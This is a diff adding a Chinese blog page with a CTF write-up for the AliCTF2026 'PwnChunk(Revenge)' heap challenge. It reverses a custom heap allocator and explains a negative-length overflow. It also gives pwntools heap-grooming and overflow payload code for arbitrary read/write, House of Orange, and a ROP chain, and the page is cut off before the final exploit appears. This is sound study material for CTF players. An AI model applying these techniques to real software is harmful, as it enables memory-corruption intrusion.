@@ -1,0 +1,662 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目简介阿里2026的一道堆题，采用的自定义堆管理器">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AliCTF2026-PwnChunk(Revenge)">
+<meta property="og:url" content="http://0x4a-210.github.io/2026/02/19/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/index.html">
+<meta property="og:site_name" content="0x4A">
+<meta property="og:description" content="题目简介阿里2026的一道堆题，采用的自定义堆管理器">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/Menu-IDA.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/My_malloc-IDA.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/AddUser-IDA-1.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/AddUser-IDA-2.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/AddMessage-IDA.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/vuln-code1.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/vuln-code2.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/slot-init.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/overflow.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/reuse.png">
+<meta property="article:published_time" content="2026-02-19T04:01:43.000Z">
+<meta property="article:modified_time" content="2026-02-20T05:33:01.413Z">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/Menu-IDA.png">
+  
+  
+  
+  <title>AliCTF2026-PwnChunk(Revenge) - 0x4A</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0x4a-210.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0x4A</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Istaroth.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="AliCTF2026-PwnChunk(Revenge)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-19 12:01" pubdate>
+          February 19, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">AliCTF2026-PwnChunk(Revenge)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>阿里2026的一道堆题，采用的自定义堆管理器<br></p>
+<span id="more"></span>
+<p>哎哎，比赛时候逆向就花了一天半，最后漏洞点都没找到，因此叫Revenge<br></p>
+<h1 id="程序逆向"><a href="#程序逆向" class="headerlink" title="程序逆向"></a>程序逆向</h1><h2 id="论坛逻辑部分"><a href="#论坛逻辑部分" class="headerlink" title="论坛逻辑部分"></a>论坛逻辑部分</h2><p>主程序是一个模拟论坛的功能，一共7个菜单选项，如下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/Menu-IDA.png" srcset="/img/loading.gif" lazyload><br>其中User类型定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">User</span>&#123;</span><br>  <span class="hljs-type">char</span> user_name[<span class="hljs-number">32</span>];<br>  <span class="hljs-type">char</span> email[<span class="hljs-number">64</span>];<br>  <span class="hljs-type">int</span> age;   <span class="hljs-number">4</span>字节<br>  <span class="hljs-comment">//4字节unused;</span><br>  <span class="hljs-type">long</span> <span class="hljs-type">long</span> * profile; <span class="hljs-comment">//指向8字节（qword）的指针</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+<p>同时留言类型定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Comment</span>&#123;</span><br>    <span class="hljs-type">char</span> userName_[<span class="hljs-number">32</span>]; <span class="hljs-comment">//绑定的用户名，其实就一个，整个系统只允许存在一个用户</span><br>    <span class="hljs-type">char</span>* title_;<br>    <span class="hljs-type">char</span>* content_;<br>    <span class="hljs-type">int</span> favors;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="堆管理器部分"><a href="#堆管理器部分" class="headerlink" title="堆管理器部分"></a>堆管理器部分</h2><p>主要是1个16块轮转的堆管理器，chunk头部固定0x18字节，采用双向链表</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemNode</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> size;           <span class="hljs-comment">// chunk大小</span><br>    <span class="hljs-type">int</span> prevChunkAddr;       <span class="hljs-comment">// 前一个chunk的地址（用于合并）</span><br>    MemNode *prev;           <span class="hljs-comment">// 双向链表：前一个节点</span><br>    MemNode *next;           <span class="hljs-comment">// 双向链表：后一个节点</span><br>&#125;;<br><br><span class="hljs-comment">// LargeChunkHeader - 大块内存的头部</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LargeChunkHeader</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> size;<br>    LargeChunkHeader *prev;<br>    LargeChunkHeader *next;<br>&#125;;<br><br><span class="hljs-comment">// MemRegion - 内存区域结构</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemRegion</span> &#123;</span><br>    <span class="hljs-type">int</span> regionSize;          <span class="hljs-comment">// 区域总大小</span><br>    <span class="hljs-type">int</span> dataSize;            <span class="hljs-comment">// 数据大小</span><br>    MemNode *memNodeRootA;   <span class="hljs-comment">// MemNode根节点A</span><br>    <span class="hljs-type">int</span> dataStart;           <span class="hljs-comment">// 数据起始偏移</span><br>    <span class="hljs-type">int</span> dataEnd;             <span class="hljs-comment">// 数据结束偏移</span><br>    MemRegion *pre;          <span class="hljs-comment">// 前一个区域</span><br>    MemRegion *next;         <span class="hljs-comment">// 后一个区域</span><br>    <span class="hljs-type">int</span> isFree;              <span class="hljs-comment">// 是否空闲</span><br>    <span class="hljs-type">int</span> minSize;             <span class="hljs-comment">// 最小大小</span><br>    MemNode firstNode;       <span class="hljs-comment">// 第一个节点（内嵌）</span><br>&#125;;<br><br><span class="hljs-comment">// MemoryPool - 主控制结构（类似main_arena）</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryPool</span> &#123;</span><br>    MemRegion *accuracyMemRegionListActive[NUM_HEAPS];  <span class="hljs-comment">// 16个活跃的内存区域</span><br>    <span class="hljs-type">uint32_t</span> idx;            <span class="hljs-comment">// 当前堆索引（用于循环分配）</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+<p>自定义实现的malloc和glibc类似，如下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/My_malloc-IDA.png" srcset="/img/loading.gif" lazyload><br>对于My_malloc全部逆完不现实，只要知道该堆管理器采用的是仅一个空闲链表即可，每次分配时根据$rebase(0x5060)+128处的下标去对应MemRegion里best fit的堆块（可以理解为一个没有各种bins的ptmalloc）<br><br>同时free时，遍历16个MemRegion，找到被释放堆块所属region，然后进行合并，更新region根节点<br><br>结合之前菜单所列举的功能，我们重点分析每个功能对16片arena轮转时下标的影响（因为每次调用My_malloc时下标会+1）<br><br>对于用户类型，只要关注Add和Delete功能即可，其中Add功能在正常情况下会调用两次My_malloc：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/AddUser-IDA-1.png" srcset="/img/loading.gif" lazyload><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/AddUser-IDA-2.png" srcset="/img/loading.gif" lazyload><br>对于留言类型，每次Add会调用三次My_malloc,同时值得注意的是在Add功能中的扩容逻辑，因为所有留言存在偏移0x50f8处的指针数组里，留言每增加10次数组扩容1次<br><br>更重要的，扩容也是整个程序里唯一合法调用My_free的地方<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/AddMessage-IDA.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="漏洞点定位"><a href="#漏洞点定位" class="headerlink" title="漏洞点定位"></a>漏洞点定位</h1><p>漏洞点在于自定义的malloc函数内部存在一个错误的类型转换，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/vuln-code1.png" srcset="/img/loading.gif" lazyload><br>搭配AddUser函数中添加简介时的终止检查逻辑——不按长度检查，而是检查当前指针和终止指针是否相等：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/vuln-code2.png" srcset="/img/loading.gif" lazyload><br>因此只要简介长度输入负数，My__int_malloc依然可以返回一个正常的MemNode，但在输入简介内容时，只要不输入回车可以无限长度的溢出写<br><br>不过需要注意的是，在分配时如果对应下标的内存区域为空指针，会先创建对应的MemRegion，所以必须先把16个区域填满：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/slot-init.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>完整的利用分6步：</p>
+<ol>
+<li>先去溢出某一个留言对应的结构体（记作x号留言），然后选择显示留言，可以泄露一个堆地址<br></li>
+<li>在第1步中溢出的同时修改留言结构体里的标题指针的最后一字节，使其指向另一个留言对应的结构体（记作y号留言）<br></li>
+<li>经过1、2以后，就拿到了一个无限次的任意地址读和任意地址写：通过x号留言的编辑功能，将y号留言的标题指针指向任意地址+y号留言的编辑和显示功能<br></li>
+<li>修改top chunk的size字段，打一次House of Orange泄露libc地址<br></li>
+<li>任意读libc.symbols[“environ”]，算出main函数返回地址的栈<br></li>
+<li>任意写main函数的返回地址，打rop<br></li>
+</ol>
+<h2 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h2><p>上述步骤的难点在于1、2两步，因为该堆管理器是16片轮转的，需要非常精心的控制下标，具体需要满足下面的约束条件：</p>
+<ol>
+<li>x号留言的标题和y号留言本身是从同一个MemRegion分配得到（将这个MemRegion对应的下标记作target_）——保证x-&gt;title_和y仅最低字节不同<br></li>
+<li>最终溢出时的简介必须在x号留言的低地址方向——具体将扩容时free的堆块申请回给用户简介使用，也就是说，扩容时合并回去的那个堆块所属的MemRegion，必须和分配用户简介时是同一个（记这个下标&#x3D;reuse_）<br><br>上述思路总结成图示如下：<br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/overflow.png" srcset="/img/loading.gif" lazyload><br>首先如上图所示，分配x-&gt;title_和分配y时，下标之差是16的整数倍，这样可以保证x的标题地址和y地址是从同一片MemRegion取出，仅最低字节不同<br><br>当x取16，y取6对应的代码如下：<br></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">AddUser(io)<span class="hljs-comment">#开始2次</span><br><span class="hljs-comment">#溢出触发有条件：slot不能为空，arena不能为空，这里申请一堆16次、20次，只是为了-2能触发漏洞</span><br><span class="hljs-comment">#具体怎么凑到的：16次单申请，slot+16，15次三个三个申请，16+15*3=61</span><br><span class="hljs-comment">#在申请第16个评论的标题之前，一共有2（开始2次）+61+2（2次扩容，开始1次，content10的时候1次）+1=66次</span><br><span class="hljs-comment">#66%16=2，所以第16个评论的标题在申请时，slot在第2个arena</span><br><span class="hljs-comment">#第6个评论本身：2（开始的2次）+1（开始的1次扩容）+16+5*3+1=34，34%16=2，所以第6个评论的结构体在申请时，slot在第2个arena</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):  <br>    AddMessage(io,title_len_=<span class="hljs-number">0x9000</span>,title_=<span class="hljs-string">b&quot;I don&#x27;t want title,just padding&quot;</span>,content_len_=<span class="hljs-number">0x9000</span>,content_=<span class="hljs-string">b&quot;I don&#x27;t want content,just padding&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>): <span class="hljs-comment">#一通操作确保第16个评论的title和第6个评论的结构体申请到接近的位置（仅地址的最低字节不同）</span><br>    <span class="hljs-comment">#其中第11次发送留言时，会先扩容，此时原来的留言数组free后是放在第三个slot里合并</span><br>    <span class="hljs-comment">#算下此时的slot下标：2+1+16+10*3=49，49%16=1，第1个arena</span><br>    <span class="hljs-comment">#刚好前面算好了第16个留言本身在第1个arena，只要后面溢出的堆块是这次扩容出来的（记为master_chunk），就能任意写第16个留言本身</span><br>    AddMessage(io,title_len_=<span class="hljs-number">0x100</span>,title_=<span class="hljs-string">b&quot;0x100_title&quot;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>).encode(),content_len_=<span class="hljs-number">0x100</span>,content_=<span class="hljs-string">b&quot;0x100_content&quot;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>).encode())<br></code></pre></td></tr></table></figure>
+<p>之后控制添加用户简介时取出的堆块在x留言前方，这里用了1次扩容时的free操作，先把满足条件的堆块合并回MemRegion，示意图如下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/AliCTF2026-PwnChunk(Revenge)/reuse.png" srcset="/img/loading.gif" lazyload><br>图中表示的是reuse_下标对应的MemRegion随时间变化的大致过程，同样，当x&#x3D;16，y&#x3D;6时，对应的这部分代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>): <span class="hljs-comment">#一通操作确保第16个评论的title和第6个评论的结构体申请到接近的位置（仅地址的最低字节不同）</span><br>    <span class="hljs-comment">#其中第11次发送留言时，会先扩容，此时原来的留言数组free后是放在第三个slot里合并</span><br>    <span class="hljs-comment">#算下此时的slot下标：2+1+16+10*3=49，49%16=1，第1个arena</span><br>    <span class="hljs-comment">#刚好前面算好了第16个留言本身在第1个arena，只要后面溢出的堆块是这次扩容出来的（记为master_chunk），就能任意写第16个留言本身</span><br>    AddMessage(io,title_len_=<span class="hljs-number">0x100</span>,title_=<span class="hljs-string">b&quot;0x100_title&quot;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>).encode(),content_len_=<span class="hljs-number">0x100</span>,content_=<span class="hljs-string">b&quot;0x100_content&quot;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>).encode())<br><span class="hljs-comment">#上面的事情干完后，这里填bio_len_=-2已经可以触发溢出了，接下来，想办法在DeleteUser时，申请到第6个评论的前面某个位置</span><br>DeleteUser(io) <span class="hljs-comment">#仅置0，对管理器状态无影响</span><br>AddUser(io,bio_len_=<span class="hljs-number">0</span>,bio_=<span class="hljs-string">b&quot;I don&#x27;t want bio,just padding&quot;</span>) <span class="hljs-comment">#slot+1</span><br>AddMessage(io,title_len_=<span class="hljs-number">0x100</span>,title_=<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">16</span>,content_len_=<span class="hljs-number">0x100</span>,content_=<span class="hljs-string">b&#x27;2&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#slot+4，也是该步骤free掉了master_chunk</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>): <span class="hljs-comment">#为了控制slot，+11次</span><br>    AddMessage(io,title_len_=<span class="hljs-number">0x9000</span>,title_=<span class="hljs-string">b&quot;I don&#x27;t want title,just padding&quot;</span>,content_len_=<span class="hljs-number">0x9000</span>,content_=<span class="hljs-string">b&quot;I don&#x27;t want content,just padding&quot;</span>)<br>DeleteUser(io)<br><span class="hljs-comment">#开头2次申请，1次扩容，16+20*3=76次申请，20次申请中有1次扩容，1+4+11=16，总共2+1+76+1+16+1=97,97%16=1，在第1个arena；</span><br><span class="hljs-comment">#申请到了master_chunk</span><br>AddUser(io,bio_len_=-<span class="hljs-number">2</span>,bio_=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0xa8</span>+p32(<span class="hljs-number">0x50</span>)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;N&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;\x68&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p>至此我们有了无限次的任意地址读和任意地址写，接下来首先泄露16号留言的标题指针<br><br>之后就是多次任意地址读写打House Of Orange——&gt;泄露environ——&gt;改main函数返回地址ret2libc<br></p>
+<h2 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 